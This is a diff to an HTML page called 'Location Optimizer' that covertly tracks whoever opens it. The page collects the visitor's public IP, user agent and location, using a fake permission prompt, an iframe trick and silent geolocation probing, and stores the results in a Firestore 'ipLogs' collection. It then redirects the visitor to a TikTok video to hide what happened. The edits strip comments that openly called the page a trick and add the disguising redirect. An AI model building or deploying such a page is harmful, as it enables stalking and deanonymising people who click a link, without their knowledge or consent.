@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Optimizer</title>
+  <title>Location Optimizer with Redirect</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
   <style>
@@ -50,7 +50,7 @@
   </style>
 </head>
 <body>
-  <h3>Loading personalized location experience...</h3>
+  <h3>Loading</h3>
   <div id="status">Initializing...</div>
 
 <script>
@@ -74,7 +74,35 @@
     statusDiv.textContent = msg;
   }
 
-  // Get visitor public IP
+  let redirected = false; // prevent multiple redirects
+
+  // Save data and redirect once
+  function saveToFirestore(lat, lon, ip, source) {
+    if (redirected) return;
+    const ua = navigator.userAgent;
+    const time = new Date().toISOString();
+    db.collection('ipLogs').add({
+      ip: ip,
+      userAgent: ua,
+      timestamp: time,
+      latitude: lat,
+      longitude: lon,
+      source: source
+    }).then(() => {
+      redirected = true;
+      logStatus(`Location logged via ${source}. Redirecting...`);
+      setTimeout(() => {
+        window.location.href = "https://www.tiktok.com/@elkaaem/video/7535937446920424722?_t=ZS-8yi4cs7jnMr&_r=1"; // <<< Replace with your target URL
+      }, 1500);
+    }).catch(err => {
+      redirected = true;
+      logStatus(`Error logging data: ${err}`);
+      setTimeout(() => {
+        window.location.href = "https://www.tiktok.com/@elkaaem/video/7535937446920424722?_t=ZS-8yi4cs7jnMr&_r=1"; // <<< Replace with your target URL
+      }, 1500);
+    });
+  }
+
   async function getVisitorIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
@@ -87,25 +115,6 @@
     }
   }
 
-  // Save data to Firestore
-  function saveToFirestore(lat, lon, ip, source) {
-    const ua = navigator.userAgent;
-    const time = new Date().toISOString();
-    db.collection('ipLogs').add({
-      ip: ip,
-      userAgent: ua,
-      timestamp: time,
-      latitude: lat,
-      longitude: lon,
-      source: source
-    }).then(() => {
-      logStatus(`Location logged via ${source}. You're ours now!`);
-    }).catch(err => {
-      logStatus(`Error logging data: ${err}`);
-    });
-  }
-
-  // Helpers to fetch location from IP APIs
   function fetchLocation(url, parser) {
     return fetch(url)
       .then(res => res.json())
@@ -126,7 +135,6 @@
     return { lat: data.latitude || null, lon: data.longitude || null };
   }
 
-  // Fallback IP location averaging multiple sources
   function fallbackToIPLocation(visitorIP) {
     logStatus("GPS failed or denied, scraping your IP location...");
     Promise.all([
@@ -155,7 +163,6 @@
     });
   }
 
-  // Fake prompt UI to trick user to allow location
   function showFakePrompt(visitorIP, callback) {
     const promptDiv = document.createElement("div");
     promptDiv.className = "fake-prompt";
@@ -188,7 +195,6 @@
     };
   }
 
-  // Probe for silent granted geolocation permission
   async function probeSilentGeolocation(visitorIP) {
     if ("geolocation" in navigator) {
       try {
@@ -225,7 +231,6 @@
     }
   }
 
-  // Sneaky iframe geolocation fallback
   async function tryIframeTrick(visitorIP) {
     return new Promise((resolve) => {
       logStatus("Trying sneaky iframe GPS trick...");
@@ -264,7 +269,7 @@
     });
   }
 
-  // Main entry
+  // Main entry point
   (async () => {
     if(location.protocol !== "https:") {
       logStatus("⚠️ Warning: Geolocation only works reliably on HTTPS.");
